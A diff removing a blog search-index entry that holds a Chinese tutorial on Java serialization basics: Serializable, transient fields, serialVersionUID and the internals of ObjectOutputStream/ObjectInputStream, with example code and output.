@@ -141,153 +141,6 @@ Transformer接口
       </tags>
   </entry>
   <entry>
-    <title>Java反序列化基础</title>
-    <url>/2025/02/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="XwBO4">一 概述</h1>
-Java序列化是指把Java对象转换为Java对象的过程。字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。
-
-<p>序列化分为两大部分：<strong>序列化和反序列化</strong>。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p>
-<h2 id="PpXVM"><font style="color:rgb(77, 77, 77);">常见序列化反序列化协议</font></h2>
-1. XML&SOAP
-
-<p>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p>
-<ol start="2">
-<li>JSON</li>
-<li>Protobuf</li>
-</ol>
-<h1 id="nThi2">二 序列化实现</h1>
-
-<p><strong>注意：只有实现了Serializable或者externalizable接口的类的对象才能被序列化为字节序列（否则抛出异常）</strong></p>
-<p>Serializable是一个空接口(所以只是用来标记)</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。</font></p>
-<h2 id="H09Qj"><font style="color:rgb(79, 79, 79);">Serializable 接口的基本使用</font></h2>
-通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream 包装 FileOutStream 将数据写入到文件中或者包装 ByteArrayOutStream 将数据写入到内存中。同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象即可。
-
-<h2 id="aLPqE">Serializable接口特点</h2>
-1. 序列化类属性没用实现Serialzable 那么在序列化时就回报错
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Person implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    </span><br><span class="line">    /*</span><br><span class="line">    其中 Color 类也需要是实现序列化接口</span><br><span class="line">     */</span><br><span class="line">    private Color color;</span><br><span class="line">    //若不实现序列化接口，则Person在序列化时也会报错</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><font style="color:rgb(77, 77, 77);">在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造</font>函数<font style="color:rgb(77, 77, 77);">来重新创建对象。</font></li>
-</ol>
-<p><font style="color:rgb(77, 77, 77);">Animal 是父类，它没有实现 Serilizable 接口</font></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;<span class="comment">//没有无参构造将会报错</span></span><br><span class="line">        System.out.println(<span class="string">&quot;调用 Animal 无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line"> </span><br><span class="line">            System.out.println(<span class="string">&quot;调用 Animal 有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Animal&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;color=&#x27;&quot;</span> + color + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">BlackCat 是 Animal 的子类</font></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlackCat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫的无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">(String color, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(color);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BlackCat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +<span class="built_in">super</span>.toString() +<span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">SuperMain 测试类</font></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./super.bin&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeAnimal();</span><br><span class="line">        deserializeAnimal();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlackCat</span>(<span class="string">&quot;black&quot;</span>, <span class="string">&quot;我是黑猫&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化前：&quot;</span>+black.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(black);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始反序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> (BlackCat) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(black);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">输出结果</font></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用 Animal 有 color 参数的构造</span><br><span class="line">调用黑猫有 color 参数的构造</span><br><span class="line">序列化前：BlackCat&#123;name=<span class="string">&#x27;我是黑猫&#x27;</span>Animal&#123;color=<span class="string">&#x27;black&#x27;</span>&#125;<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string">=================开始序列化================</span></span><br><span class="line"><span class="string">=================开始反序列化================</span></span><br><span class="line"><span class="string">调用 Animal 无参构造</span></span><br><span class="line"><span class="string">BlackCat&#123;name=&#x27;</span>我是黑猫<span class="string">&#x27;Animal&#123;color=&#x27;</span><span class="literal">null</span><span class="string">&#x27;&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从上面的执行结果来看，如果要序列化的对象的父类 Animal 没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的，这样做的目的是重新初始化父类的属性，例如 Animal 因为没有实现序列化接口，因此对应的 color 属性就不会被序列化，因此反序列得到的 color 值就为 null。</p>
-<ol start="3">
-<li>实现Serializable接口的子类也是可以被序列化的</li>
-<li>静态成员变量不能被序列化</li>
-<li>transient标识的对象成员变量不参与序列化（在属性前加关键字<strong>transient</strong>，序列化时，就不会序列化到指定位置）</li>
-</ol>
-<h2 id="JfuOj">操作文件流的类</h2>
-1. <font style="color:rgb(77, 77, 77);">ObjectOutputStream代表对象输出流：</font>
-
-<p><font style="color:rgb(77, 77, 77);">它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中</font></p>
-<ol start="2">
-<li><font style="color:rgb(77, 77, 77);">ObjectInputStream代表对象输入流：</font></li>
-</ol>
-<p><font style="color:rgb(77, 77, 77);">它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</font></p>
-<h1 id="tcqIg">三 序列化ID</h1>
-在进行序列化时，有一个serialVersionUID 。这就是序列化ID
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure>
-
-<p>这个序列化ID起着关键的作用，它决定着是否能够成功反序列化！<strong>java的序列化机制是通过判断运行时类的serialVersionUID来验证版本一致性的</strong>，在进行反序列化时，JVM会把传进来的字节流中的serialVersionUID与本地实体类中的serialVersionUID进行比较，如果相同则认为是一致的，便可以进行反序列化，否则就会报序列化版本不一致的异常。</p>
-<p>即序列化ID是为了保证成功进行反序列化</p>
-<h2 id="OVrGN">如何生成UID</h2>
-1. <font style="color:rgb(51, 51, 51);">使用 AS plugin 插件就可以生成</font>
-2. <font style="color:rgb(51, 51, 51);">在JDK中，可以利用 JDK 的 bin 目录下的 serialver 工具产生这个serialVersionUID，对于 Student.class，执行命令：serialver com.example.seriable.Student</font>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">➜  classes git:(master) ✗ /Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_111</span>.jdk/Contents/Home/bin/serialver com.example.seriable.Student </span><br><span class="line">com.example.seriable.Student:    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">6840182814363029482L</span>;<span class="comment">//这个就是工具生成的 SerialVersionUID 值了</span></span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">使用 AS plugin 的方式应该底层也是使用到这个 JDK 工具去生成的 SerialVersionUID 值，测试结果来看这两个生成的值是一样的。</font></p>
-<h3 id="serialVersionUID%20%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><font style="color:rgb(79, 79, 79);">serialVersionUID 的兼容性问题是什么？</font></h3>
-<font style="color:rgb(77, 77, 77);">具体的兼容性问题如下：</font>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.InvalidClassException: com.example.seriable.Student; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span></span><br><span class="line"><span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">926212341182608815</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">6840182814363029482</span></span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">关于这个异常，它是属于兼容问题异常，是发生在反序列化阶段，检测到 serialVersionUID 不一致导致的。具体的分析如下：</font></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">序列化时使用的 serialVersionUID = -<span class="number">926212341182608815L</span>，如果期间属性被修改了，如果 serialVersionUID 发生改变 -<span class="number">6840182814363029482</span> ，那么</span><br><span class="line">反序列化时就会出现类不兼容问题。</span><br></pre></td></tr></table></figure>
-
-<h1 id="M4sn9">四 Java的序列化步骤与数据结构分析</h1>
-
-<p><strong>序列化算法一般会按步骤做如下事情：</strong></p>
-<p>将对象实例相关的类元数据输出。</p>
-<p>递归地输出类的超类描述直到不再有超类。</p>
-<p>类元数据完了以后，开始从最顶层的超类开始输出对象实例的实际数据值。</p>
-<p>从上至下递归输出实例的数据</p>
-<h2 id="Q8oVq">writeObject原理分析</h2>
-<h3 id="LnpPf"><font style="color:rgb(77, 77, 77);">ObjectOutputStream 构造函数</font></h3>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);<span class="comment">//A</span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    enableOverride = <span class="literal">false</span>;<span class="comment">//B</span></span><br><span class="line">    writeStreamHeader();<span class="comment">//C</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>A bout：用于写入一些类元数据还有对象中基本数据类型的值，在下面会分析。</p>
-<p>B enableOverride ：false 表示不支持重写序列化过程，如果为 true ，那么需要重写 writeObjectOverride 方法。这个一般不用管它。</p>
-<p>C writeStreamHeader() 写入头信息，具体看下面分析。</p>
-<p><strong><font style="color:rgb(77, 77, 77);">ObjectOUtStream#writeObject(obj);</font></strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeShort(STREAM_MAGIC);<span class="comment">//①</span></span><br><span class="line">    bout.writeShort(STREAM_VERSION);<span class="comment">//②</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">①STREAM_MAGIC 声明使用了序列化协议，bout 就是一个流，将对应的头数据写入该流中</font></p>
-<p><font style="color:rgb(77, 77, 77);">②STREAM_VERSION 指定序列化协议版本</font></p>
-<p><strong><font style="color:rgb(77, 77, 77);">ObjectOUtStream#writeObject(obj);</font></strong></p>
-<p><font style="color:rgb(77, 77, 77);">上面是 ObjectOutStream 构造中做的事，下面来看看具体 writeObject 方法内部做了什么事？</font></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;<span class="comment">//一般不会走这里，因为在 ObjectOutputStream 构造设置为 false 了</span></span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;<span class="comment">//代码会执行这里</span></span><br><span class="line">        writeObject0(obj, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong><font style="color:rgb(77, 77, 77);">ObjectOutStream#writeObject0()</font></strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;</span><br><span class="line">        Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">        ObjectStreamClass desc;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            writeClass((Class) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">            writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="comment">// END Android-changed:  Make Class and ObjectStreamClass replaceable.</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            writeString((String) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">            writeArray(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">            writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">            writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="comment">//③</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">                    cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">① lookup 函数用于查找当前类的 ObjectStreamClass ，它是用于描述一个类的结构信息的，通过它就可以获取对象及其对象属性的相关信息，并且它内部持有该对象的父类的 ObjectStreamClass 实例。</font></p>
-<p><font style="color:rgb(77, 77, 77);">② 根据 obj 的类型去执行序列化操作，如果不符合序列化要求，那么会③位置抛出</font><code>NotSerializableException</code><font style="color:rgb(77, 77, 77);">异常。</font></p>
-<p><strong><font style="color:rgb(77, 77, 77);">ObjectOutputStream#writeOrdinaryObject</font></strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeOrdinaryObject</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                                 ObjectStreamClass desc,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        writeClassDesc(desc, <span class="literal">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br><span class="line">        <span class="comment">//③</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="comment">//④</span></span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>①写入类的元数据，TC_OBJECT. 声明这是一个新的对象，如果写入的是一个 String 类型的数据，那么就需要 TC_STRING 这个标识。</p>
-<p>②writeClassDesc 方法主要作用就是自上而下(从父类写到子类，注意只会遍历那些实现了序列化接口的类)写入描述信息。该方法内部会不断的递归调用，我们只需要关系这个方法是写入描述信息就好了。</p>
-<p>从这里可以知道，序列化过程需要额外的写入很多数据，例如描述信息，类数据等，因此序列化后占用的空间肯定会更大。</p>
-<p>③ desc.isExternalizable() 判断需要序列化的对象是否实现了 Externalizable 接口，这个在上面已经演示过怎么使用的，在序列化过程就是在这个地方进行判断的。如果有，那么序列化的过程就会由程序员自己控制了哦，writeExternalData 方法会回调，在这里就可以愉快地编写需要序列化的数据拉。</p>
-<p>④ writeSerialData 在没有实现 Externalizable 接口时，就执行这个方法</p>
-<p><strong><font style="color:rgb(77, 77, 77);">ObjectOutputstream#writeSerialData</font></strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//① </span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;<span class="comment">//②</span></span><br><span class="line">            <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">            curPut = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">&quot;custom writeObject data (class \&quot;&quot;</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);<span class="comment">//③</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>① desc.getClassDataLayout 会返回 ObjectStreamClass.ClassDataSlot[] ，我们来看看 ClassDataSlot 类，可以看到它是封装了 ObjectStreamClass 而已，所以我们就简单的认为 ① 这一步就是用于返回序列化对象及其父类的 ClassDataSlot[] 数组，我们可以从 ClassDataSlot 中获取对应 ObjectStreamClass 描述信息。</p>
-<p>② 开始遍历返回的数组，slotDesc 这个我们就简单将其看成对一个对象的描述吧。hasWriteObjectMethod 表示的是什么呢？这个其实就是你要序列化这个对象是否有 writeObject 这个 private 方法，注意哦，这个方法并不是任何接口的方法，而是我们手动写的，读者可以参考 ArrayList 代码，它内部就有这个方法。那么这个方法的作用是什么呢？这个方法我们在上面也演示过具体的使用，它就是用于自定义序列化过程的，读者可以返回到上面看看如果使用这个 writeObject 实现自定义序列化过程的。注意：其实这个过程不像实现 Externalizable 接口那样，自己完全去自定义序列化数据。</p>
-<p><font style="color:rgb(77, 77, 77);">③ defaultWriteFields 这个方法就是 JVM 自动帮我们序列化了</font></p>
-<p><strong><font style="color:rgb(77, 77, 77);">这个方法主要分为以下两步</font></strong></p>
-<ul>
-<li><font style="color:rgb(51, 51, 51);">① 写入基本数据类型的数据</font></li>
-<li><font style="color:rgb(51, 51, 51);">②写入引用数据类型的数据，这里最终又调用到了 writeObject0() 方法，读者可以返回到上面去看看具体的实现。</font></li>
-</ul>
-<h2 id="ZwkKN"><font style="color:rgb(79, 79, 79);">readObject 原理分析</font></h2>
-<font style="color:rgb(77, 77, 77);">从流中读取类的描述信息 ObjectStreamClass 实例，通过这个对象就可以创建出序列化的对象。</font>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br><span class="line">...</span><br><span class="line">  Object obj;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  	<span class="comment">//创建对应反序列化的对象</span></span><br><span class="line">    obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        desc.forClass().getName(),</span><br><span class="line">        <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">读取该对象及其对象的父类的 ObjectStreamClass信息</font></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">然后遍历得到每一个 ObjectStreamClass 对象，将对应的属性值赋值给需要反序列化的对象。</font></p>
